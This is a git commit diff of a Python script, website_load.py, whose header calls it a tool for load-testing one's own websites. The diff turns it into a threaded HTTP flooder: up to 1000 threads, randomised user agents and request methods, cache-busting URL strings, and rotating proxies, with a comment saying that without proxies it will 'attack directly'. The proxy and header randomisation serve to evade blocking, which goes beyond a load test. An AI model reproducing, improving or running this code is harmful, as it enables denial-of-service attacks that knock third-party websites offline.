5e5716143504a5f3f743d817bd534f8ff358137b
Alexey Privalov <Alex0007lolpvp@gmail.com>
2014-01-30 09:10:30 +0600

    totally rewrited.added proxy support|multi url|..

--- website_load.py
+++ website_load.py
@@ -1,7 +1,6 @@
 # -*- coding: utf-8 -*-
 # Script created for testing your own websites
 # by Alexey Privalov | www.alex0007.ru
-import socket
 import threading
 import urllib.request
 import time
@@ -10,8 +9,15 @@ import sys
 import string
 
 # Global parameters
-thread_limit = 250  # Number of threads
-user_agent = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1734.5 Safari/537.36"
+thread_limit = 1000
+referrer = ""
+request_methods = ["GET", "HEAD"]
+timeout_max = 30
+timeout_min = 0
+user_agents = []  # in file 'useragents.txt'
+proxies = []  # in file 'proxies.txt' if none - attack directly
+url = []  # from file 'urls.txt' or enter manually
+append_rand_string_to_url = False
 # Global parameters end
 
 
@@ -21,12 +27,8 @@ class Flooder(threading.Thread):
 
     def run(self):
         try:
-            sock = socket.socket()
-            if sock.connect_ex((ip, 80)) != 0:
-                raise Exception("Connect Error")
-            sock.setblocking(0)
             while True:
-                randstr = '/' + ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
+                randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
                 q1 = str(round(random.uniform(0.5, 0.7), 1))
                 q2 = str(round(random.uniform(0.7, 1), 1))
                 cur_header = {
@@ -37,15 +39,19 @@ class Flooder(threading.Thread):
                     "Connection": "Keep-Alive",
                     "Cache-Control": "no-cache",
                     "Pragma": "no-cache",
-                    "User-agent": user_agent + randstr,
+                    "User-agent": random.choice(user_agents),
+                    "Referrer": referrer,
                     "Accept-Encoding": "gzip,deflate"
                 }
-                sock.sendall(str.encode(
-                    "GET " + randstr + target.path + " HTTP/1.1\r\nHost: " + target.netloc + "\r\n" + str(
-                        cur_header) + "\r\n\r\n\r\n"))
-
+                request = urllib.request.Request(random.choice(url), headers=cur_header) if not append_rand_string_to_url else urllib.request.Request(url + randstr, headers=cur_header)
+                if len(proxies) > 0:
+                    proxy = {"http": "http://%s" % random.choice(proxies)}
+                    proxy_support = urllib.request.ProxyHandler(proxy)
+                    opener = urllib.request.build_opener(proxy_support, urllib.request.HTTPHandler())
+                    urllib.request.install_opener(opener)
+                request.method = random.choice(request_methods)
+                response = urllib.request.urlopen(request, timeout=random.randint(timeout_min, timeout_max))
         except:
-            sock.close()
             sys.exit()
             pass
 
@@ -70,14 +76,53 @@ class Checker(threading.Thread):
                 except:
                     print("Can't check website status")
 
-#  some input url preparations
-if len(sys.argv) == 2:
-    target = sys.argv[1]
-else:
-    print('Enter target url or IP ( e.g. "http://google.com" or "http://195.208.0.133"):')
-    target = input()
 
-target = urllib.parse.urlparse(target)
+class SettingsReader():
+    def __init__(self):
+        self.read_useragents()
+        self.read_urls()
+        self.read_proxies()
+
+    @staticmethod
+    def read_file_to_array(file_desc):
+        file_desc.seek(0)
+        array = [line.strip() for line in file_desc]
+        return array
+
+    def read_useragents(self):
+        global user_agents
+        file = open("useragents.txt", "a+")
+        user_agents = self.read_file_to_array(file)
+        if len(user_agents) == 0:
+            def_user_agent = 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1797.2 Safari/537.36'
+            user_agents.append(
+                def_user_agent)
+            file.write(
+                def_user_agent)
+        file.close()
+
+    def read_urls(self):
+        global url, target
+        file = open("urls.txt", "a+")
+        url = self.read_file_to_array(file)
+        if len(url) == 0:
+            print('Enter target url or IP ( e.g. "http://google.com/" or "http://195.208.0.133/"):')
+            target = input()
+            url.append(target)
+        file.close()
+
+    def read_proxies(self):
+        global proxies
+        file = open("proxies.txt", "a+")
+        proxies = self.read_file_to_array(file)
+        file.close()
+
+
+
+
+SettingsReader()
+
+target = urllib.parse.urlparse(random.choice(url))
 if target.netloc.__len__() == 0:
     print("Incorrect url input")
     sys.exit()
@@ -87,16 +132,11 @@ if str(target.path).__len__() == 0:
 str_target = target.scheme + "://" + target.netloc + target.path
 # preparations ended
 
-#  getting IP
-try:
-    ip = socket.getaddrinfo(target.netloc, 80)[0][4][0]
-    print(ip)
-except:
-    print("Can't get ip")
-    sys.exit()
-#  end IP getting
+print("Flooding %s" % target.netloc)
+print(str(len(user_agents))+' user agents detected')
+print(str(len(url))+' urls detected')
+print(str(len(proxies))+' proxies detected')
 
-print("Flooding %s" % str_target)
 Checker().start()
 while True:
     if threading.active_count() <= thread_limit:
